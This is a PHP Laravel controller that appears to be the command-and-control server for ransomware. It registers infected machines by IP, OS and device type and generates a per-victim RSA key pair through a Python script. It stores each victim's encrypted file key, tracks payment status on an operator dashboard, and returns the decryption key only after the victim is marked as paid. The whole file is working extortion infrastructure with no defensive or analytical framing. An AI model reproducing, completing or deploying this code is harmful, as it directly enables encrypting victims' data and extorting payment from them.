<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\RansomWare;
use Validator;

class RansomWareController extends Controller
{
  
  public function __construct(){

    $this->middleware('auth');
  }

  public function index(){

    $clients = RansomWare::all()->count();


    $paid = RansomWare::where('isPaid', 1)->get()->count();

 
    $unpaid = RansomWare::where('isPaid', 0)->get()->count();


    return view('home',compact('paid', 'unpaid', 'clients'));

  }
  public function ransomWare(){
      
  	$ransoms = RansomWare::all();

   
  	return view('ransomware', compact('ransoms'));
  }

  public function createRSAKeys(Request $request){
      
  	$validator = Validator::make($request->all(), [
       
     'publicIp' => 'required',
     'device_type'=> 'required',
     'os' => 'required'

  	], $this->errors());
  
 
      if($validator->fails()){
        return response()->json([
           
          'message' => $validator->messages()->all()

        ],422);
      }


       
      $v = 'python3'.' '.base_path().'/keys.py 2>&1';
      $output = exec($v, $all);

      $str = implode($all);

      // print($str)
 
      $pos = strpos($str, '-----BEGIN RSA PRIVATE');

      $privatekey = substr($str, $pos, -1);

      $publickey = substr($str, 0, $pos);
      
      //this removes b' and 'b' from RSA public key
      $publickey = substr($publickey, 2, -3);

    
    	RansomWare::create([

        'publickey' => $publickey,
        'privatekey' => $privatekey,
        'publicIp' => $request->publicIp,
        'os' => $request->os,
        'device_type' => $request->device_type,

    	]);

		 return $publickey;

    
  }

  public function updateFernet(Request $request){
    
    //removes byte 'b' and ' from beginning and end
    $publickey = substr($request->publickey, 2, -1);
    
    //removes byte 'b' and ' from beginning and end
    $enc_fernet_key = substr($request->enc_fernet_key, 2, -1);

    $ransom = RansomWare::where('publickey', $publickey)->first();

    if(RansomWare::where('publickey', $publickey)->exists()){

     $ransom->enc_fernet_key = $enc_fernet_key;

     $ransom->is_encrypted = 1;

     $ransom->save();

     return response()->json('Key Updated');

    }

    return response()->json('Key not available');
  }

  public function errors(){
       
    return [
      'publicIp.required' => 'The public Ip is required',
      'device_type.required'=> 'The device Type is required',
      'os.required'=> 'The OS Type is required',
    ]; 

  }



  public function isPaid(Request $request){

		
    $validator = Validator::make($request->all(), [
       
     'enc_fernet_key' => 'required',
    
    ], [

      'enc_fernet_key.required' => 'The key is required'

    ]);
  
 
    if($validator->fails()){

      return response()->json([
         
        'message' => $validator->messages()->all()

      ],422);
    }

    //removes byte 'b' and ' from beginning and end
    $enc_fernet_key = substr($request->enc_fernet_key, 2, -1);

  	$ransom = RansomWare::where('enc_fernet_key', $enc_fernet_key)->first();

    if(RansomWare::where('enc_fernet_key', $enc_fernet_key)->exists()){

    	if($ransom->isPaid == 1 || $ransom->isPaid == '1'){

            
        $v = 'python3'.' '.base_path().'/decrypt.py 2>&1'.' '.$ransom->id;

        $output = exec($v, $value);

                  
        return response()->json([

         'status' => 'Paid', 

         'fernetkey' => $value

        ]);

    	}

      return response()->json([

       'status' => 'Not Paid',

      ]);
    }  


  	return response()->json([
         
      'status' => 'Not available'

  	]);
  }

  public function decrypted(Request $request){


    $validator = Validator::make($request->all(), [
       
     'enc_fernet_key' => 'required',
    
    ], [

      'enc_fernet_key.required' => 'The key is required'

    ]);
  
 
    if($validator->fails()){

      return response()->json([
         
        'message' => $validator->messages()->all()

      ],422);
    }

    //removes byte 'b' and ' from beginning and end
    $enc_fernet_key = substr($request->enc_fernet_key, 2, -1);



    $ransom = RansomWare::where('enc_fernet_key', $enc_fernet_key)->first();

    if(RansomWare::where('enc_fernet_key', $enc_fernet_key)->exists()){


      $ransom->is_encrypted = 0;

      $ransom->save(); //update this place
                
      return response()->json($ransom);

    }

    return response()->json(['Bad Response']);
    
  }

 //checks if ransom is paid
  public function paid($id){

      $ransom = RansomWare::find($id);

      $ransom->isPaid = 1;

      $ransom->save();

      return redirect()->back()->with('status', 'Marked as Paid');
  }

  public function notPaid($id){

      $ransom = RansomWare::find($id);

      $ransom->isPaid = 0;

      $ransom->save();

      return redirect()->back()->with('status', 'Marked as Not Paid');
  }

 


  public function getData($id){
     
    $ransom = RansomWare::find($id);

    return response()->json([

     'enc_fernet_key' => $ransom->enc_fernet_key,
     'private_key'   => $ransom->privatekey

    ]);
      
  }

}
